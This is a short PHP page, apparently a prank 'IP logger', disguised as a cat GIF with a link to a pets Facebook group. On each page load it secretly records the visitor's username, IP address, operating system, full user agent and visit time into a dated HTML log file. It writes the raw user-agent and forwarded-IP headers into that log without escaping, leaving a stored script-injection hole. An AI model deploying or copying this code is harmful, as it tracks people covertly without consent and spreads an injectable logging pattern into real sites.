<title>MAQAAA</title>
<?php
// MAQA (C) Coded and managed by K|nG ; akukaj@msn.com
// All gretz to K|nG and Punisher
/*niti code */

$koha = date('d.m.Y h:i:s A');
$skedari = date("dmy");
$name = $user['user_name'];
$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
 // check which browser you're using....
 $useragent = $_SERVER['HTTP_USER_AGENT'];
if (preg_match('|MSIE ([0-9].[0-9]{1,2})|',$useragent,$matched)) {
 $browser_version=$matched[1];
 $browser = 'IE';
 } elseif (preg_match('|Opera/([0-9].[0-9]{1,2})|',$useragent,$matched)) {
 $browser_version=$matched[1];
 $browser = 'Opera';
 } elseif(preg_match('|Firefox/([0-9\.]+)|',$useragent,$matched)) {
 $browser_version=$matched[1];
 $browser = 'Firefox';
 } elseif(preg_match('|Safari/([0-9\.]+)|',$useragent,$matched)) {
/*
matches chrome and safari since they are basically the same,
you can add a check for chrome by simply copy pasting
and typing 'chrome' rather than safari
*/
 $browser_version=$matched[1];
 $browser = 'Safari';
 } else {
 // browser not recognized!
 $browser_version = 0;
 $browser= 'other';
 }
 //os
 if (strstr($useragent,'Windows')) {
 $os='Win';
 } else if (strstr($useragent,'Mac')) {
 $os='Mac';
 } else if (strstr($useragent,'Linux')) {
 $os='Linux';
 } else if (strstr($useragent,'Unix')) {
 $os='Unix';
 } else {
 $os='Other';
 }
 // SSS
mkdir("data/$skedari");
$file = "data/$skedari/index.html"; //Select file
$file = fopen($file, "a"); //Appened file
$data = "<hr><span style='color:darkgreen'>USERI: </span><span style='color:red'><b>$name</b> </span><span style='color:darkgreen'><b>***</b></span> IP: <a href='https://gwhois.org/$ip' target='_blank'><span style='color:red'>$ip</span></a> <- Kliko kqyre pi kahit eshte!<br> E perdor sistemin operativ $os shfletuesin $useragent <span style='color:red'>KOHA KUR U KON: </span><b><span style='color:darkgreen'>$koha</span></b><br>";
fwrite($file, $data . "\n"); //Write data to file
fclose($file); // Close the file
// echo "Your IP adddress <b>$ip</b> has been logged :D";
	?>
<br><br><br><br><br><br>
<center><h1><img alt="" src="http://i.imgur.com/oPW0DHA.gif" style="height:265px; width:403px" /><br />
<br />
Cfare maqeee :P</h1><br><a href="http://facebook.com/groups/boutpets"><b>Bashkangjitju grupit te kafsheve ne facebook! I love my pets >>> Kliko ketu</b></a></center>
